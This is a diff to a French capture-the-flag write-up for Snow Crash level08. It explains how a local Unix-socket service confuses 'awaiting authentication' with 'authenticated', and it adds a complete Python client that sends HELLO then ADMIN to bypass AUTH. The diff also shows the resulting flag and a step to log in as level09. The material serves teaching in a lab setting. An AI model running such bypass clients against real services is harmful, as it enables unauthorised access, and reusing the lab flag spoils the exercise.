@@ -1,5 +1,7 @@
 # Level08 — Contourner une authentification par un défaut d’état
 
+**Point de départ :** une session sur la VM Snow Crash sous `level08`. Le flag de ce niveau sert de mot de passe au compte `level09`.
+
 ## Objectif
 
 Nous sommes connectés avec l’utilisateur `level08` et nous cherchons le secret de `flag08` afin de passer à `level09`.
@@ -24,7 +26,7 @@ id
 find /opt/snowcrash/level08 -maxdepth 3 -ls
 ```
 
-Les observations conservées indiquent que `level08` appartient au groupe `blacksun`. Deux fichiers sont particulièrement intéressants :
+Vérifier que `level08` appartient au groupe `blacksun`. Fichiers à rechercher :
 
 | Fichier | Explication |
 | --- | --- |
@@ -37,7 +39,7 @@ Nous lisons le code source :
 cat /opt/snowcrash/level08/blacksun.c
 ```
 
-Il révèle notamment :
+Éléments à confirmer dans le code source, qui n’est pas fourni dans cette archive :
 
 - le socket `/run/blacksun/blacksun.sock` ;
 - les commandes `HELLO`, `AUTH` et `ADMIN` ;
@@ -46,11 +48,9 @@ Il révèle notamment :
 - le chemin `/home/flag08/.flag` ;
 - la vérification incorrecte de l’état de la connexion.
 
-Lire ce fichier revient à consulter le plan d’un coffre-fort : nous pouvons étudier chaque mécanisme pour chercher une erreur de conception.
-
 ## 2. Comprendre le socket Unix
 
-Un socket est un canal qui permet à deux programmes de communiquer. Nous pouvons le comparer à une ligne téléphonique locale : notre client appelle Black Sun, puis les deux programmes échangent des messages.
+Un socket est un canal qui permet à deux programmes de communiquer.
 
 ```text
 client Python
@@ -63,15 +63,15 @@ client Python
 service Black Sun
 ```
 
-Le groupe `blacksun` possède les permissions nécessaires pour contacter ce socket. Cela nous donne le droit de parler au service, mais pas automatiquement celui d’accéder à ses informations protégées.
+Vérifier que les permissions du socket permettent au groupe `blacksun` de s’y connecter. Ce droit de connexion ne constitue pas une authentification.
 
-Cette différence est importante :
+Trois notions distinctes :
 
 - **communiquer** signifie pouvoir envoyer des messages au programme ;
 - **s’authentifier** signifie prouver son identité ;
 - **être autorisé** signifie avoir le droit d’effectuer une action précise.
 
-La clé `/etc/blacksun/auth.key` sert normalement à l’authentification. La solution ne la lit pas et ne la modifie pas.
+Vérifier dans le code source que `/etc/blacksun/auth.key` est la clé utilisée pour l’authentification. La solution ne la lit pas et ne la modifie pas.
 
 ## 3. Comprendre la faille
 
@@ -102,23 +102,21 @@ ADMIN autorisé
 
 ### Fonctionnement vulnérable
 
-Dans le code étudié, `HELLO` place la connexion dans un état nommé `AUTH`. Cet état devrait seulement signifier **« en attente d’authentification »**.
+La méthode repose sur l’hypothèse que `HELLO` place la connexion dans un état nommé `AUTH`. Cet état devrait seulement signifier **« en attente d’authentification »**.
 
-Cependant, la macro `CHECK_STATE` utilisée pour `ADMIN` accepte déjà un état supérieur ou égal à `AUTH`. Le service confond donc le fait d’avoir atteint l’étape d’authentification avec le fait de l’avoir réussie.
+Vérifier que la macro `CHECK_STATE` utilisée pour `ADMIN` accepte un état supérieur ou égal à `AUTH`. Si c’est le cas, le service confond l’attente de l’authentification avec sa réussite.
 
-La séquence suivante suffit alors :
+Séquence à tester :
 
 ```text
 HELLO → état AUTH → ADMIN accepté
 ```
 
-La commande `AUTH` et la preuve d’identité sont entièrement sautées.
-
-Imaginons une banque : nous disons bonjour à l’agent de sécurité, qui devrait ensuite nous demander une pièce d’identité. Mais il considère par erreur que le simple fait d’être arrivé à l’étape du contrôle signifie que notre identité a déjà été validée. Il nous laisse donc entrer dans la zone protégée sans effectuer le contrôle.
+Le client envoie ces deux messages sans envoyer de commande `AUTH`.
 
 ## 4. Pourquoi utiliser un script Python ?
 
-Connaître la faille ne suffit pas : il faut encore envoyer les commandes dans le format exact attendu par Black Sun.
+Le client doit respecter le format binaire du protocole.
 
 Le service n’attend pas directement le texte suivant :
 
@@ -127,7 +125,7 @@ HELLO
 ADMIN
 ```
 
-Il attend des messages binaires composés d’un en-tête et, parfois, d’un contenu. Le fichier [client.py](client.py) sert donc de traducteur entre nos intentions et le protocole de Black Sun.
+Il attend des messages binaires composés d’un en-tête et, parfois, d’un contenu. Le client Python, reproduit intégralement en section 9, construit ces messages.
 
 Il utilise deux modules de la bibliothèque standard de Python :
 
@@ -141,11 +139,9 @@ import struct
 | `socket` | Ouvrir la communication avec Black Sun et échanger des octets. |
 | `struct` | Encoder les nombres dans le format binaire attendu par le programme C. |
 
-Le script ne crée pas la faille. Il automatise simplement l’envoi des deux messages qui permettent de l’exploiter.
-
 ## 5. Comprendre la structure d’un message
 
-Un message peut être comparé à un colis : l’en-tête est son étiquette et le payload est son contenu.
+Le client utilise la structure suivante, à comparer au protocole défini dans le code C :
 
 | Élément | Taille | Rôle |
 | --- | ---: | --- |
@@ -171,11 +167,11 @@ header = bytes([first_byte]) + struct.pack(
 
 ## 6. Comprendre le checksum
 
-Le checksum est une valeur de contrôle. Le service le recalcule à partir du payload, puis vérifie que le résultat correspond à celui placé dans l’en-tête.
+Le checksum est une valeur de contrôle calculée à partir du payload. Vérifier dans le code C que le service recalcule cette valeur et la compare à celle de l’en-tête.
 
-Nous pouvons le comparer à un code de contrôle calculé à partir du contenu d’un colis. Si le contenu change pendant le transport, le code recalculé à l’arrivée ne correspond plus. Le vrai calcul est différent, mais son rôle reste de détecter une incohérence dans le message.
+Un checksum peut détecter certaines modifications du contenu, mais des contenus différents peuvent avoir la même valeur.
 
-Le client reproduit la formule trouvée dans le code C :
+Le client utilise la formule suivante ; sa correspondance avec le code C reste à confirmer :
 
 ```python
 def checksum(payload):
@@ -242,7 +238,7 @@ payload : ad de
 | `00` | Octet réservé. |
 | `ad de` | Payload `0xDEAD` en little-endian. |
 
-Black Sun répond `HELLO OK` et place la connexion dans l’état `AUTH`.
+Réponse attendue : `HELLO OK`. Le passage à l’état `AUTH` doit être confirmé dans le code C.
 
 ### Message `ADMIN`
 
@@ -262,14 +258,56 @@ La longueur et le checksum valent zéro, car le message ne contient aucun payloa
 
 ## 9. Comprendre le client
 
-Le script [client.py](client.py) effectue les actions suivantes :
+Le client complet est reproduit ci-dessous, sans modification :
+
+```python
+#!/usr/bin/env python3
+import socket
+import struct
+
+
+SOCKET_PATH = "/run/blacksun/blacksun.sock"
+VERSION = 1
+
+
+def checksum(payload):
+    result = 0
+    for index, byte in enumerate(payload):
+        result ^= byte ^ (index & 0xFF)
+    return result
+
+
+def send_message(sock, command, state, payload=b"", response_lines=1):
+    first_byte = VERSION | (state << 3) | (command << 5)
+    # The fields use 7 bytes; the service reads an 8-byte raw header.
+    header = bytes([first_byte]) + struct.pack(
+        "<IHB", len(payload), checksum(payload), 0
+    )
+    sock.sendall(header + payload)
+
+    response = bytearray()
+    while response.count(b"\n") < response_lines:
+        chunk = sock.recv(1)
+        if not chunk:
+            break
+        response.extend(chunk)
+    return response.decode()
+
+
+with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as sock:
+    sock.connect(SOCKET_PATH)
+    print(send_message(sock, command=0, state=0, payload=b"\xad\xde"), end="")
+    print(send_message(sock, command=2, state=1, response_lines=2), end="")
+```
+
+Il effectue les actions suivantes :
 
 1. Il ouvre une connexion vers `/run/blacksun/blacksun.sock`.
 2. Il construit le message `HELLO` dans le bon format.
 3. Il calcule le checksum du payload et envoie le message.
-4. Il lit la réponse `HELLO OK`.
+4. Il lit la première réponse, attendue sous la forme `HELLO OK`.
 5. Il construit et envoie directement le message `ADMIN`, sans envoyer de commande `AUTH`.
-6. Il lit la réponse administrative et le secret affiché par le service.
+6. Il lit jusqu’à deux lignes de réponse administrative.
 
 Les fonctions principales ont chacune un rôle précis :
 
@@ -284,7 +322,7 @@ Le bloc `with socket.socket(...) as sock` ferme automatiquement le socket à la 
 
 ## 10. Exécuter le client
 
-Dans la session ouverte avec `level08`, nous créons un fichier temporaire et y copions le contenu exact de [client.py](client.py) :
+Depuis `level08`, créer un fichier temporaire et y copier le bloc Python complet de la section 9 :
 
 ```bash
 vi /tmp/blacksun_client.py
@@ -296,7 +334,7 @@ Nous lançons ensuite le script :
 python3 /tmp/blacksun_client.py
 ```
 
-Résultat rapporté :
+Résultat de référence (à confirmer sur la VM) :
 
 ```text
 HELLO OK
@@ -304,4 +342,17 @@ ACCESS GRANTED
 FLAG=s5cAhoAfNT9GrgqykhZavyBg9
 ```
 
-Le service nous donne le secret sans que nous ayons fourni la clé d’authentification.
+Si cette sortie est confirmée, le service a fourni le secret sans vérification de la clé d’authentification.
+
+## Passer au niveau suivant
+
+Après avoir confirmé le flag sur la VM, essayer `su - level09` avec cette valeur comme mot de passe, puis contrôler le compte courant avec `id -un`. Résultat attendu : `level09`. Cette connexion reste à valider.
+
+## Validation sur la VM
+
+Les valeurs et extraits de terminal ci-dessus proviennent de la solution fournie ; ils ne constituent pas une nouvelle preuve d’exécution. Les vérifications suivantes restent à effectuer :
+
+- [ ] Confirmer les groupes, les fichiers et les permissions du socket.
+- [ ] Relever les extraits du code C relatifs aux commandes, aux états, à `CHECK_STATE`, au format, au checksum et à l’authentification.
+- [ ] Comparer les messages et les réponses du client au comportement réel du service.
+- [ ] Confirmer le flag et le passage à `level09`.
